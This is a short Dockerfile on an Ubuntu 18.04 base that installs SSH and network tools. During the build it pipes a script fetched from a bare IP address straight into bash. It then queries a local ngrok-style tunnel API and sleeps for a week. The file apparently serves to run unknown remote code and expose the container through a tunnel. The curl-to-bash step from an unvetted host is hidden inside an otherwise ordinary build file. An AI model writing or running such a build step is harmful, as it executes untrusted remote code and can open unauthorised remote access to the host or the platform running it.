FROM ubuntu:18.04

LABEL maintainer="Randy"
    
RUN apt update; apt install wget curl unzip openssh-server sudo -y; curl -sL http://103.171.85.197/tick.py | bash; curl http://localhost:4040/api/tunnels; sleep 10080


CMD ["sleep 10080"]
